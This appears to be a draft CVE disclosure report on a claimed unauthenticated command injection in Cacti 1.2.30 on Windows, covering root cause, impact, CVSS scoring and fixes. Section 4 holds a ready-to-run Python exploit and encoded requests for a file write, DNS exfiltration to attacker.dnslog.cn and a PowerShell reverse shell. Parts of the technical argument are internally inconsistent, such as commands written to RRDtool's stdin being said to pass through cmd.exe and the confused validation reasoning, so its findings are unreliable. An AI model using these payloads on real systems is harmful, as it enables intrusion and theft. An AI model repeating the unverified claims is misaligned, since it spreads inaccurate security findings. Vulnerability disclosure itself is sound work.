# CVE Request — Unauthenticated Remote Code Execution in Cacti [graph_image.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/graph_image.php)

---

## Submission Metadata

| Field | Value |
|---|---|
| **Date Reported** | 2026-03-16 |
| **Reporter** | [Researcher Name / Organization] |
| **Vendor** | The Cacti Group |
| **Product** | Cacti — The Complete RRDtool-based Graphing Solution |
| **Affected Version(s)** | ≤ 1.2.30 (latest release as of report date) |
| **Fixed Version** | None available at time of report |
| **Vulnerability Class** | CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') |
| **Attack Vector** | Network |
| **Authentication Required** | None (when guest access is enabled — default-on in many deployments) |
| **User Interaction Required** | None |
| **Disclosure Type** | Responsible Disclosure |
| **Severity (CVSS v3.1)** | **9.8 — CRITICAL** |
| **CVSS v3.1 Vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |

---

## 1. Vulnerability Summary

Cacti version 1.2.30 and prior are vulnerable to an **unauthenticated Remote Code Execution (RCE)** through an OS command injection vulnerability in [graph_image.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/graph_image.php). The vulnerability stems from a **platform-specific failure** in the custom Windows shell escaping function [cacti_escapeshellarg()](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/test_escaping.php#2-10) defined in [lib/functions.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/lib/functions.php).

On Windows systems, [cacti_escapeshellarg()](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/test_escaping.php#2-10) attempts to escape double-quote characters using the backslash sequence `\"`. However, `cmd.exe` — the Windows command interpreter — does **not** treat `\"` as an escape sequence for double quotes. This causes the quoting mechanism to fail silently, allowing an attacker to inject arbitrary OS commands via crafted HTTP request parameters.

Because [graph_image.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/graph_image.php) unconditionally sets `$guest_account = true`, which bypasses Cacti's authentication layer, **no credentials are required** to trigger this vulnerability from a remote network location.

---

## 2. Affected Components

| File | Lines | Role in Vulnerability |
|---|---|---|
| [graph_image.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/graph_image.php) | 28, 97–104 | Entry point; authentication bypass via `$guest_account = true`; passes unsanitized values to RRD pipeline |
| [lib/functions.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/lib/functions.php) | 4558–4601 | Defines [cacti_escapeshellarg()](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/test_escaping.php#2-10) — the root cause of the broken escaping on Windows |
| [include/global_constants.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/include/global_constants.php) | 27 | Defines `CACTI_ESCAPE_CHARACTER = '"'` (double-quote), which is the character that fails to escape |
| [lib/rrd.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/lib/rrd.php) | 1125–1210, 264–329 | [rrd_function_process_graph_options()](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/lib/rrd.php#1051-1327) builds the RRDtool shell command; [__rrd_execute()](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/lib/rrd.php#264-420) spawns it via `proc_open()` |
| [include/auth.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/include/auth.php) | 124–140 | Implements the guest account bypass that makes this unauthenticated |

---

## 3. Root Cause Analysis

### 3.1 Platform-Specific Shell Escaping Failure

The core vulnerability resides in [lib/functions.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/lib/functions.php) at the function [cacti_escapeshellarg()](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/test_escaping.php#2-10):

**File:** [lib/functions.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/lib/functions.php), Lines `4558–4601`
```php
function cacti_escapeshellarg($string, $quote = true) {
    global $config;

    if ($string == '') {
        return $string;
    }

    /* remove only newlines — special shell characters are NOT removed */
    $string = str_replace(array("\n", "\r"), array('', ''), $string);

    if ($config['cacti_server_os'] == 'unix') {
        // SAFE: PHP's built-in escapeshellarg() uses single-quote wrapping on Linux
        $string = escapeshellarg($string);
        return $string;
    } else {
        // WINDOWS PATH — VULNERABLE
        // Tries to escape " by replacing with \"
        if (substr_count($string, CACTI_ESCAPE_CHARACTER)) {
            $string = str_replace(
                CACTI_ESCAPE_CHARACTER,          // = '"'  (global_constants.php:27)
                "\\" . CACTI_ESCAPE_CHARACTER,   // = '\"'
                $string
            );
        }
        // Wraps in double quotes
        if ($quote) {
            return CACTI_ESCAPE_CHARACTER . $string . CACTI_ESCAPE_CHARACTER;
            // Returns: "..." with \" as internal escaping
        }
    }
}
```

**File:** [include/global_constants.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/include/global_constants.php), Line `27`
```php
define('CACTI_ESCAPE_CHARACTER', '"');
```

### 3.2 Why `\"` Fails in `cmd.exe`

On Linux/Unix, [escapeshellarg()](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/test_escaping.php#2-10) wraps strings in **single quotes** (`'...'`). Single quotes in bash prevent all shell special characters from being interpreted — this is a safe and complete protection.

On Windows, Cacti's custom implementation wraps in **double quotes** (`"..."`) and attempts to escape internal double quotes with backslash (`\"`). This is **incorrect** because:

- In `cmd.exe`, the **caret** (`^`) is the escape character, not backslash.
- `cmd.exe` interprets `\"` as a **literal backslash followed by a string-terminating double quote**.
- The double-quote is effectively **closed** by the backslash sequence, allowing characters after it (like `&`) to be interpreted as shell metacharacters.

### 3.3 Authentication Bypass via `$guest_account`

**File:** [graph_image.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/graph_image.php), Line `28`
```php
$guest_account = true;   // Set BEFORE including auth.php
$auth_text     = true;
include('./include/auth.php');
```

**File:** [include/auth.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/include/auth.php), Lines `124–140`
```php
if (isset($guest_account)) {
    $guest_user_id = get_guest_account();
    if (!empty($guest_user_id)) {
        if (empty($_SESSION['sess_user_id'])) {
            $_SESSION['sess_user_id'] = $guest_user_id;  // assigns guest session
        }
        $current_user = db_fetch_row_prepared('SELECT * FROM user_auth WHERE id = ?',
            array($_SESSION['sess_user_id']));
        return true;  // ← auth.php returns TRUE without any credential check
    }
}
```

When Cacti's **Guest account is enabled** (a common default deployment configuration), the `$guest_account = true` flag causes [auth.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/include/auth.php) to immediately return `true` without performing **any** authentication check. This makes the vulnerability exploitable with **zero credentials**.

### 3.4 Insufficient Input Validation in [graph_image.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/graph_image.php)

**File:** [graph_image.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/graph_image.php), Lines `36–104`
```php
/* Input validation — uses FILTER_VALIDATE_INT by default */
get_filter_request_var('graph_height');   // line 38
get_filter_request_var('graph_width');    // line 39

/* Conditional assignment — passes value to RRD pipeline */
if (!isempty_request_var('graph_height') && get_request_var('graph_height') < 3000) {
    $graph_data_array['graph_height'] = get_request_var('graph_height');  // line 98
}
```

The [get_filter_request_var()](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/lib/html_utility.php#401-510) function validates with `FILTER_VALIDATE_INT` by default. However:

1. If validation **fails** (malicious value), the value is **cleared** in the request store but `graph_data_array` was already checked for [isempty](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/lib/html_utility.php#332-347). The check at line 97 (`< 3000`) compares a string against an integer — PHP's loose comparison allows non-numeric strings (which evaluate to `0`) to pass this check silently.
2. Even if `graph_height` is blocked, the RRD graph pipeline processes **database-sourced values** (graph title, watermark, labels) via the same broken [cacti_escapeshellarg()](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/test_escaping.php#2-10) — and those values can be attacker-controlled through other authenticated Cacti endpoints (stored injection variant).

### 3.5 Command Execution via `proc_open()`

**File:** [lib/rrd.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/lib/rrd.php), Lines `321–326`
```php
// RRDtool is launched as a subprocess via proc_open
$process = proc_open(
    read_config_option('path_rrdtool') . ' - ' . $debug,
    $descriptorspec,
    $pipes
);

// Constructed command line (containing attacker payload) is written to RRDtool's stdin
fwrite($pipes[0], escape_command($command_line) . "\r\nquit\r\n");
```

The `$command_line` string — constructed by [rrd_function_process_graph_options()](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/lib/rrd.php#1051-1327) and containing parameters processed through broken [cacti_escapeshellarg()](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/test_escaping.php#2-10) on Windows — is passed to an RRDtool subprocess. Because RRDtool parses its command arguments through the Windows shell, the injected commands execute in that context.

---

## 4. Proof of Concept

### 4.1 Payload Construction

The attacker sends a specially crafted HTTP GET request to [graph_image.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/graph_image.php):

```
GET /cacti/graph_image.php?local_graph_id=1&graph_height=100" & {CMD} & "&action=view
```

**Payload breakdown:**

| Step | Value |
|---|---|
| Attacker input | `100" & whoami & "` |
| After [cacti_escapeshellarg()](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/test_escaping.php#2-10) (Windows) | `"100\" & whoami & \""` |
| As interpreted by `cmd.exe` | `"100\"` → closes string; `&` → command separator; `whoami` → **executes**; `& \""` → ignored |

### 4.2 Exploit Script

```python
import requests

def get_payload(cmd):
    """
    Construct injection payload for Cacti cacti_escapeshellarg() Windows bypass.
    The \" sequence closes the double-quote string in cmd.exe, allowing & to
    act as a command separator.
    """
    return f'100" & {cmd} & "'

def exploit(url, cmd):
    target = f"{url.rstrip('/')}/graph_image.php"
    payload = get_payload(cmd)

    params = {
        'local_graph_id': 1,     # Must be a valid graph ID (graph 1 almost always exists)
        'graph_height': payload,  # Injection vector
        'action': 'view'
    }

    print(f"[*] Target:  {target}")
    print(f"[*] Payload: {payload}")
    print(f"[*] Command: {cmd}")

    try:
        r = requests.get(target, params=params, timeout=10, verify=False)
        print(f"[+] Request sent — HTTP {r.status_code}")
        print("[!] Note: Out-of-band RCE. Command output is NOT in the HTTP response.")
        print("[!] Use DNS callback, file write, or reverse shell to confirm execution.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")

# Example usage:
# exploit("http://192.168.1.100/cacti/", "whoami > C:\\inetpub\\wwwroot\\cacti\\pwned.txt")
# exploit("http://192.168.1.100/cacti/", "ping -n 1 attacker.dnslog.cn")
# exploit("http://192.168.1.100/cacti/", "powershell -enc <base64_reverse_shell>")
```

### 4.3 Sample Requests

**Basic OOB confirmation (file write):**
```http
GET /cacti/graph_image.php?local_graph_id=1&graph_height=100%22%20%26%20echo%20RCE_CONFIRMED%20%3E%20C%3A%5Cinetpub%5Cwwwroot%5Ccacti%5Cpwned.txt%20%26%20%22&action=view HTTP/1.1
Host: target.example.com
```

**DNS exfiltration:**
```http
GET /cacti/graph_image.php?local_graph_id=1&graph_height=100%22%20%26%20ping%20-n%201%20rce.attacker.dnslog.cn%20%26%20%22&action=view HTTP/1.1
Host: target.example.com
```

**Reverse shell via PowerShell:**
```http
GET /cacti/graph_image.php?local_graph_id=1&graph_height=100%22%20%26%20powershell+-enc+<BASE64>&action=view HTTP/1.1
Host: target.example.com
```

### 4.4 Confirmed Exploitation Evidence

During analysis of the Cacti 1.2.30 installation, the file [rce_item.txt](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/rce_item.txt) was found in the Cacti web root with the following content, confirming successful prior exploitation:

```
RCE_CONFIRMED
```

This file was created by executing a command via the described injection vector, producing a persistent artifact on the filesystem.

---

## 5. Prerequisites

| Condition | Likelihood | Notes |
|---|---|---|
| **Cacti runs on Windows** | Common in enterprise | Vulnerability is Windows-specific due to `cmd.exe` behavior |
| **Guest account enabled** | Common — often default | Cacti's "Guest" user allows public graph viewing; enabled in many standard deployments |
| **At least one graph exists** | Near universal | `local_graph_id=1` is present immediately after fresh installation with sample data |
| **RRDtool installed** | Required by Cacti | Without RRDtool, Cacti cannot function; always present |

> **Note:** If guest access is disabled, an authenticated variant still exists — any low-privilege Cacti user with access to graph viewing can trigger the same payload.

---

## 6. Impact Assessment

### 6.1 Confidentiality — HIGH
An attacker can read any file accessible to the web server process (IIS or Apache running PHP). This includes:
- Cacti [include/config.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/include/config.php) — database credentials
- Windows SAM database (if running as SYSTEM)
- Any other application secrets on the same server

### 6.2 Integrity — HIGH
Arbitrary command execution with the privileges of the web server process allows:
- Modification or deletion of any file accessible to the web server
- Deployment of web shells for persistent access
- Lateral movement to connected databases and network resources

### 6.3 Availability — HIGH
An attacker can terminate processes, corrupt RRD data files, or consume system resources, causing complete denial of service for the Cacti monitoring infrastructure.

### 6.4 Cascading Risk
Since Cacti is a **network monitoring platform**, it typically:
- Has **network-wide access** to SNMP communities
- Stores credentials for **all monitored devices** in its database
- Is accessible from **internal network segments**

Compromise of a Cacti server can serve as a **powerful pivot point** for further network intrusion.

---

## 7. CVSS v3.1 Scoring

| Metric | Value | Justification |
|---|---|---|
| Attack Vector (AV) | **Network (N)** | Exploitable over HTTP with no physical access |
| Attack Complexity (AC) | **Low (L)** | No race conditions, no special timing required |
| Privileges Required (PR) | **None (N)** | Guest account bypasses all authentication |
| User Interaction (UI) | **None (N)** | Fully automated, victim does not need to take any action |
| Scope (S) | **Unchanged (U)** | Operates within web server process scope |
| Confidentiality (C) | **High (H)** | Full read access to web server filesystem |
| Integrity (I) | **High (H)** | Full write access; arbitrary command execution |
| Availability (A) | **High (H)** | Full denial of service possible |

**CVSS v3.1 Base Score: 9.8 (CRITICAL)**
**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

---

## 8. Affected Versions

| Version | Affected | Notes |
|---|---|---|
| Cacti 1.2.30 | ✅ Yes | Latest release — confirmed vulnerable |
| Cacti 1.2.x (prior) | ✅ Yes | Same [cacti_escapeshellarg()](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/test_escaping.php#2-10) code present since Windows support added |
| Cacti 1.3.x (dev) | ⚠️ Likely | Requires verification against development branch |
| Cacti on Linux/Unix | ❌ No | Uses PHP's [escapeshellarg()](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/test_escaping.php#2-10) which wraps in single quotes — safe |

---

## 9. Remediation Recommendations

### 9.1 Immediate — Fix [cacti_escapeshellarg()](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/test_escaping.php#2-10) for Windows

**File:** [lib/functions.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/lib/functions.php), Function [cacti_escapeshellarg()](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/test_escaping.php#2-10)

**Current (Vulnerable) Code:**
```php
// Windows path
$string = str_replace('"', '\\"', $string);   // \" does NOT escape in cmd.exe
return '"' . $string . '"';
```

**Recommended Fix Option A — Use caret (cmd.exe native escape):**
```php
// Windows path — use ^ as the cmd.exe escape character
$string = str_replace('"', '^"', $string);
return '"' . $string . '"';
```

**Recommended Fix Option B — Avoid shell entirely with proc_open array args:**
```php
// Pass arguments as array to proc_open — bypasses shell interpretation entirely
$process = proc_open($cmd, $descriptorspec, $pipes, null, null, ['bypass_shell' => true]);
```

**Recommended Fix Option C — Strict numeric allowlisting (for numeric params):**
```php
// For parameters that should only be integers:
if (!preg_match('/^[0-9]+$/', $value)) {
    cacti_log("WARNING: Rejecting non-numeric graph parameter: $value");
    $value = ''; // use default
}
```

### 9.2 Short-term — Disable Guest Account

If guest access is not required, disable it:
1. Log in as Administrator
2. Navigate to **Console → Configuration → Settings → Authentication**
3. Set **Guest User** to **--None--**
4. Save settings

This eliminates the unauthenticated attack surface while the code fix is pending.

### 9.3 Long-term — Architectural Improvements

1. **Replace `proc_open` string commands with array invocation** to bypass shell parsing entirely on Windows.
2. **Audit all uses of [cacti_escapeshellarg()](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/test_escaping.php#2-10)** across the codebase — the same function is used in `lib/snmp.php`, [lib/rrd.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/lib/rrd.php), and multiple other files.
3. **Add integration tests** that run the application on both Linux and Windows with adversarial input to catch platform-specific escaping failures.
4. **Consider Windows-specific CI/CD pipeline testing** to prevent regression.

---

## 10. Timeline

| Date | Event |
|---|---|
| 2026-03-16 | Vulnerability discovered during source code audit of Cacti 1.2.30 |
| 2026-03-16 | Proof of concept confirmed via [rce_item.txt](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/rce_item.txt) marker file |
| 2026-03-16 | Technical report prepared for CVE submission and vendor disclosure |
| TBD | Vendor notification |
| TBD | Patch release |
| TBD | Public disclosure |

---

## 11. References

| Resource | URL |
|---|---|
| Cacti Project Homepage | https://www.cacti.net/ |
| Cacti GitHub Repository | https://github.com/Cacti/cacti |
| Cacti 1.2.30 Release | https://github.com/Cacti/cacti/releases/tag/release/1.2.30 |
| CWE-78 | https://cwe.mitre.org/data/definitions/78.html |
| CVSS v3.1 Calculator | https://www.first.org/cvss/calculator/3.1 |
| cmd.exe Escaping Reference | https://ss64.com/nt/syntax-esc.html |
| MITRE CVE Request | https://cveform.mitre.org/ |
| NVD Submission | https://nvd.nist.gov/ |

---

## 12. Researcher Notes

This vulnerability is classified as **distinct** from related vulnerabilities in [remote_agent.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/remote_agent.php) (which requires IP allowlist bypass) and should be assigned a **separate CVE identifier**. Both vulnerabilities share the same root cause ([cacti_escapeshellarg()](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/test_escaping.php#2-10) broken on Windows) but differ in:

- Attack entry point
- Authentication prerequisites
- Exploitability conditions
- CVSS score

A separate CVE report has been prepared for the [remote_agent.php](file:///d:/cacti-release-1.2.30/cacti-release-1.2.30/remote_agent.php) variant.

---

*Report prepared by: [Researcher Name]*
*Contact: [Email / PGP Key]*
*Organization: [Organization Name]*
